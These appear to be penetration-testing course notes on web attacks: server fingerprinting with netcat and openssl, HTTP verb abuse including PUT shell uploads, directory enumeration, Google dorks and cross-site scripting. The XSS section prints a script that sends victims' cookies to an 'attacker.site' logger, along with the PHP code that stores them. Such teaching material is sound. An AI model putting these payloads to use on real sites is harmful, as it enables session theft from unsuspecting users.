    - Web Application Attacks
        - Web Server Fingerprinting
            - Fingerprinting a web server means detecting:
                - The daemon providing the web server service, such as IIS, Apache, nginx, and others.
                - Its version.
                - The operating system of the machine hosting the server.
            - Fingerprinting with Netcat:
                - Netcat is a very popular tool that is also known as the "TCP/IP Swiss army Knife". You can use Netcat in many different ways; it can be both a server or a client.
                - To fingerprint a web server you can use Netcat as a client to manually send requests to the server.
                - Banner grabbing: to grab a banner you just have to connect to a listening daemon and then read the banner it sends back to your client.
                - To connect to an HTTP server you have to pass the destination host and the destination port to Netcat. Most of the time, you will just use the default HTTP port (80). -- `nc <target address> 80`
                - After connecting, you have to send a valid HTTP request, which you can do by using the HEAD HTTP Verb. This verb requests the header of a resource (a web page for example).
                - Remember that every HTTP request has two empty lines between the header and the body of the request itself, so when sending body-less request like HEAD, you still have to append two empty lines. -- `nc <target> 80 \nHEAD / HTTP/1.0`
                - After sending the two empty lines, the target server will process your request and send a response message back.
                - Most of the time the response contains a `Server:` header containing information about the web server and, sometimes, the server operating system.
                - Common Mistakes:
                    - Beware of a couple of common mistakes when fingerprinting web servers with Netcat:
                        - You have to write the request in UPPERCASE.
                        - Netcat does not notify you after the connection to the server; you must write your request after running the command. You can change this behavior by using the verbose (-v) command line switch.
                        - Netcat does not perform any kind of encryption, so you cannot use it to connect to an HTTPS daemon.
            - Fingerprinting with OpenSSL:
                - The openssl command is a command line interface to manually use various features of the OpenSSL SSL/TLS toolkit.
                - You can use it to establish a connection to an HTTPS service and then send the usual HEAD HTTP Verb.
                - ```shell
openssl s_client -connect <target site>:443
HEAD / HTTP/1.0```
            - Limits of Manual Fingerprinting:
                - When performing fingerprinting, one thing to note is that system administrators can customize web servers banners; this is to make the fingerprinting activity harder for attackers.
                - Automatic tools go beyond banner grabbing. They fingerprint web servers by checking small implementation-dependent details such as:
                    - Headers ordering in response messages
                    - Errors handling
            - Fingerprinting with Httprint
                - Httprint is a web server fingerprinting tool that uses a signature-based technique to identify web servers.
                - The most used syntax is pretty simple: `httprint -P0 -h <target hosts> -s <signature file>`
                    - -P0 to avoid pinging the host (most web servers do not respond to ping echo requests)
                    - -h <target hosts> tells the tool to fingerprint a list of hosts. It is advised to use the IP address of the hosts you want to test. You can also provide a range of IP addresses
                    - -s set the signature file to use
        - HTTP Verbs
            - The most common HTTP methods are:
                - GET 
                - POST
                - HEAD
                - PUT DELETE
            - GET:
                - GET is used to request a resource. When a user wants to open a web page, the browser sends a GET request.
                    - ```html
GET /page.php HTTP/1.1
Host: www.example.site```
                - GET can also pass arguments to the web application.
                    - ```javascript
GET /page.php?course=PTS HTTP/1.1
Host: www.example.site```
            - POST:
                - POST is used to submit HTML form data. POST parameters must be in the message body.
                    - ```javascript
POST /login.php HTTP/1.1
Host: www.example.site

username=john&password=mypass```
            - HEAD:
                - HEAD is very similar to GET, as it asks just headers of the response instead of the response body.
                    - ```javascript
HEAD / HTTP/1.1
Host: www.example.site```
            - PUT:
                - PUT is used to upload a file to the server. As you can imagine, it is a very dangerous feature if it is allowed and mis-configured.
                    - ```javascript
PUT /path/to/destination HTTP/1.1
Host: www.example.site

<PUT data>```
            - DELETE:
                - DELETE is used to remove a file from the server; this is another feature that must be configured wisely as a misused DELETE leads to denial of service and data loss.
                    - ```javascript
DELETE /path/to/destination HTTP/1.1
Host: www.example.site```
            - OPTIONS:
                - OPTIONS is used to query the web server for enabled HTTP Verbs.
                    - ```javascript
OPTIONS / HTTP/1.1
Host: www.example.site```
            - REST APIs:
                - Representation State Transfer Application Programming Interface -- existence of web applications.
                - REST APIs are a specific type of web application that relies strongly on almost all HTTP Verbs.
                - They are often referred to as "web services" or simply "APIs".
                - It is common for such applications to use "PUT" for saving data and not for saving files.
                - Before you report that a "PUT/DELETE" method was found during a penetration testing engagement, you should confirm its exact impact twice.
                - It is sometimes easy to confuse REST API's PUT method, which simply creates new content with a PUT method that allows us to create an arbitrary file.
                - After issuing a PUT request, you should try to look for the existence of the file you created.
            - Using HTTP 1.0 Syntax:
                - Using the HTTP 1.1 syntax implies also sending a Host: header in your request. If you use HTTP 1.0, you can skip the Host: header.
                - `OPTIONS / HTTP/1.0`
            - Exploiting Misconfigured HTTP Verbs:
                - Enumeration with OPTIONS:
                    - You can do that by sending an OPTIONS message with Netcat.
                    - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2FUjGOlKLZe2.png?alt=media&token=923630fb-0d4c-4719-b48a-afdbcec9ccbb)`IMG`
                - Exploiting DELETE:
                    - To exploit the DELETE verb, you just have to specify the file you want to delete from the server; this shows how an unauthenticated DELETE method can remove an arbitrary resource on the server.
                    - `IMG`
                - Exploiting PUT:
                    - Exploiting a PUT method is more complex because you have to know the size of the file you want to upload on the server. To do that you can use the Unix utility wc (word counter) with its -m parameter to count how long, in bytes, your payload is.
                    - `IMG`
                - Uploading a PHP Shell with PUT:
                    - The following code contains a small but effective PHP shell.
                    - `IMG`
                    - Remember that PUT requires that we pass the content length. 
                    - Then valid PHP script.
                    - `IMG`
        - Directories and File Enumeration
            - Users or search engines can not find resources that are not linked by a web page on the internet.
            - Enumeration helps you find those "hidden" resources that often contain:
                - New and untested features
                - Backup files
                - Testing information
                - Developer's notes
                - and many other types of information left there because "no one knows their URL".
            - Discovering unpublished, old or backup files can give you a lot of information and sometimes access to very sensitive files.
            - There are two ways to enumerate resources:
                - Pure brute-force
                - Dictionary attacks
            - Brute-force Enumeration:
                - Pure brute-force is very simple; you have to try every possible combination of characters; this is the only way to test for every possible resource name. On the other hand, this method is very inefficient since you will test a lot of non-existing resources.
            - Dictionary-based Enumeration:
                - So another, faster, way to enumerate resources is to use a list of common file names, directory names and files extensions.
                - Using a dictionary to enumerate web resources is much more efficient than using pure brute force.
            - Enumerating Web Resources with Dirbuster:
                - Even if you have a dictionary at your disposal, testing all common resources names and extensions by hand would be impractical. Fortunately, this testing process can be automated.
                - A very common tool to perform web enumeration is OWASP Dirbuster. It is java application that can perform web resources enumeration.
                - To use it you have to set your target (i.e., the URL of the site you want to test)
                - You can then choose if you want to perform a pure brute-force or a dictionary-based brute-force.
                - By clicking on the Browser button, you can specify the list to use for your tests.
                - Then, you can set the testing options.
            - Enumerating Web Resources with Dirb:
                - There is a Linux alternative to Dirbuster, called Dirb.
                - Dirb is a command line tool which also helps to enumerate web resources within an application.
        - Google Hacking
            - Another way to find files and directories on a web site is to use advanced search engine features.
            - A penetration tester can use Google's advanced query commands, also known as Google Dorks, to find specific resources.
            - Google dorks are a special combination of Google commands used to find specific resources or web pages.
            - Here are some useful search commands:
                -  ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2FYXLNlze7bS.png?alt=media&token=1972c949-91f0-4d0e-819e-ba53cdb1befb)
            - Resources:
                - [Book](https://www.amazon.com/Google-Hacking-Penetration-Testers-Johnny/dp/1597491764/ref=sr_1_1?ie=UTF8&qid=1302083660&sr=8-1)
                - [Documentation](https://developers.google.com/custom-search/docs/xml_results)
                - [Google Hacking Database](https://www.exploit-db.com/google-hacking-database
)
        - Cross Site Scripting
            - Cross Site Scripting (XSS) is a vulnerability that lets an attacker control some of the content of a web application.
            - By exploiting a Cross Site Scripting, the attacker can target the web application users.
            - By using an XSS, an attacker can:
                - Modify the content of the site at run-time;
                - Inject malicious contents;
                - Steal the cookies, thus the session, of a user;
                - Perform actions on the web application as if it was a legitimate user;
                - And much more!
            - XSS Actors:
                - The actors involved in an XSS attack are:
                    - The vulnerable web site
                    - The victim user (visitor of the website)
                    - The penetration tester
                - Vulnerable Web Applications:
                    - A vulnerable web application is what makes XSS attacks possilble.
                    - XSS vulnerabilities happen when a web application uses unfiltered user input to build the output content displayed to its end users; this lets an attacker control the output HTML and JavaScript code, thus attacking the application users.
                    - In this kind of attack, user input is any parameter coming from the client side of the web app, such as:
                        - Request headers
                        - Cookies
                        - Form inputs
                        - POST parameters
                        - GET parameters
                    - All these input channels should be validated server side by well-implemented security functions that should sanitize or filter users' input.
                    - The only way to prevent a cross-site scripting vulnerability is to never, ever, trust user input!
                - Users:
                    - Most of the time, the victims of XSS attacks are the users or the visitors of a site. Keep in mind that one of the users could be an administrator of the website itself!
                    - XSS involves injecting malicious code into the output of a web page. This malicious code is then rendered (or executed) by the browser of the visiting users.
                    - Moreover,if a web application is vulnerable to XSS, it can be really hard for a victim to realize that an attack is in progress; most of the time, attacks are very subtle and do not involve any visible change on the vulnerable site.
                - Attackers:
                    - Malicious users exploit XSS vulnerabilities to attack the users of a web site by:
                        - Making their browsers load malicious content
                        - Performing operations on their behalf, like buying a product or changing a password
                        - Stealing their session cookies, thus being able to impersonate them on the vulnerable site
                    - Impersonating a user can lead to an entire web site takeover.
            - Finding an XSS:
                - To find an XSS you have to look at every user input, and test if it is somehow displayed on the output (reflection point) of the web application.
                - After finding a reflection point, you have to understand if you can inject HTML code and see if it somehow gets to the output of the page; this lets you control the output page!
                - You can use any valid HTML tag and try to understand if it gets to the page. Looking at the HTML sources of the output page helps to understand how to build an XSS payload.
                - Sometimes it is just a matter of injecting a harmless tag like <i>, <pre>, or <plaintext>.
                - To test XSS, you can inject some valid HTML/ JavaScript code, like `<script>alert('XSS')</script>`
                - To exploit an XSS vulnerability that you find, you need to know the type of cross-site scripting attack you are carrying out. Cross-site scripting vulnerabilities can be reflected, persistent or DOM Based.
            - Reflected XSS Attacks:
                - Reflected attacks happen when the malicious payload is carried inside the request that the browser of the victim sends to the vulnerable website.
                - They could be triggered by posting a link on a social network or via a phishing campaign. When users click on the link, they trigger the attack.
                - Reflected XSS Filters:
                    - Some browsers, like Google Chrome, have a reflected XSS filter built in. This means that they will not run some XSS reflected attacks.
                    - The reality is that they can only filter trivial and known XSS attacks. There are advanced attacks that can bypass Anti-XSS filters.
                - Persistent XSS Attacks:
                    - Persistent XSS attacks occur when the payload is sent to the vulnerable web server and then stored. When a web page of the vulnerable website pulls the stored malicious code and puts it within the HTML output, it will deliver the XSS payload.
                    - It is called persistent because the malicious code gets delivered each and every time a web browser hits the "injected" web page.
                    - This is a very dangerous form of XSS because, with a single attack, the hacker can exploit multiple web application users.
                    - The most common vector for persistent attacks are HTML forms that submit content to the web server and then display that content back to the users.
                    - Elements such as comments, user profiles, and forum posts are a potential vector for XSS attacks.
                - Cookie Stealing via XSS:
                    - JavaScript can access cookies if they do not have the HttpOnly flag enabled; this means that an XSS attack can be used to steal the cookies. In many cases, stealing a cookie means stealing a user session!
                    - `<script> alert(document.cookie)</script>`
                    - ```javascript
<script>
  var i=new Image();
	i.src="http://attacker.site/log.php?q="+document.cookie;
</script>```
                    - The log.php script saves the cookie in a text file on the attacker.site:
                    - ```javascript
<?php
$filename="/tmp/log.txt";
$fp=fopen($filename, 'a');
$cookie=$_GET['q'];
fwrite($fp, $cookie);
fclose($fp);
?>```
                - Resources:
                    - The Web Application Hacker's Handbook
                    - OWASP-XSS
        - SQL Injections
